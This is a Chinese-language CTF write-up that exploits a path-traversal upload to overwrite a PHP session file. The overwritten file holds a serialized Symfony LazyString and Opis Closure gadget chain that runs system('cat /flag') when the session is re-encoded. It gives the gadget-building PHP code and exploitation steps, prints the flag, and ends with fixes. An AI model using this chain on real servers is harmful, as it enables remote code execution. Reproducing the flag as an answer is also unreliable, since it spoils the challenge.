# Upload it 1

## 题目简述

应用允许上传小于 1 MiB 的文件，默认目录为 `/tmp/sandbox/<md5>`。用户可控的 `path` 直接拼接到上传目录后，没有规范化或边界检查，因此可以用目录穿越把文件写到 `/tmp`。应用还在请求开始时调用 `session_start()`，依赖中包含 `symfony/string` 和 `opis/closure`。

预期解利用目录穿越覆盖一个自选 Session 文件。PHP 在请求结束时会重新编码仍处于活动状态的 Session；如果其中放入 `Symfony\Component\String\LazyString`，编码过程会触发 `__sleep`，继而执行其 callable。把 Opis Closure 封装的匿名函数作为 callable，即可在 Session 刷盘阶段执行 `cat /flag`。

## 解题过程

上传目标由下面的字符串拼接产生：

```php
$upload_file_path = $_SESSION['upload_path'] . '/' . $_POST['path'];
$upload_file = $upload_file_path . '/' . $file['name'];
move_uploaded_file($file['tmp_name'], $upload_file);
```

若当前目录是 `/tmp/sandbox/<hash>`，令 `path=../..`、文件名为 `sess_<target-id>`，解析后的目标就是 `/tmp/sess_<target-id>`。这里应使用两个不同的 Session ID：普通 Session A 负责完成上传，未使用过的 Session B 作为恶意文件名。若直接覆盖当前活动的 Session A，请求结束时正常的 Session 保存逻辑可能再次覆盖该文件。

先在相同依赖版本下生成恶意对象：

```php
<?php
namespace Symfony\Component\String {
    class LazyString {
        private $value;
        public function __construct($value) {
            $this->value = $value;
        }
    }
}

namespace {
    require 'vendor/autoload.php';

    $closure = function () {
        system('cat /flag');
    };

    $wrapped = unserialize(\Opis\Closure\serialize($closure));
    $object = new \Symfony\Component\String\LazyString($wrapped);
    echo 'pwn|' . serialize($object);
}
```

`php` Session handler的文件语法是：

```text
session_key|serialized_value
```

因此生成文件以 `pwn|` 开头，后面紧跟完整的 `LazyString` 序列化串。利用步骤如下：

1. 选择随机且未使用的目标 ID，例如 `sctf-target-01`。
2. 以普通 Session A 上传恶意文件，表单字段设为 `path=../..`，文件名设为 `sess_sctf-target-01`。
3. 新建请求并设置 `PHPSESSID=sctf-target-01`。
4. `session_start()` 从 `/tmp/sess_sctf-target-01` 恢复对象；请求结束时 Session 编码器再次序列化它。
5. `LazyString::__sleep` 触发字符串求值，调用 Opis Closure 封装的匿名函数并输出 `/flag`。

得到：

```text
SCTF{sl3ep_ch@in_1s_so_c0oO0o0ooOo00ol!!!}
```

## 方法总结

这道题不要求上传到 Web 根目录。任意文件上传与可预测的 PHP Session 文件路径组合后，已经能把攻击者选择的序列化对象送入应用。预期链的特别之处在于危险动作发生于请求关闭时的 Session 重编码，而不是仅在反序列化入口发生。

修复应对拼接后的路径执行规范化并验证其仍位于用户目录内，上传文件名也必须由服务端生成；Session 文件目录不应与应用可写目录交叉。与此同时，不应把能够触发 callable 的复杂对象写入 Session，并应审计 `__sleep`、`__serialize` 等保存阶段的隐式执行路径。
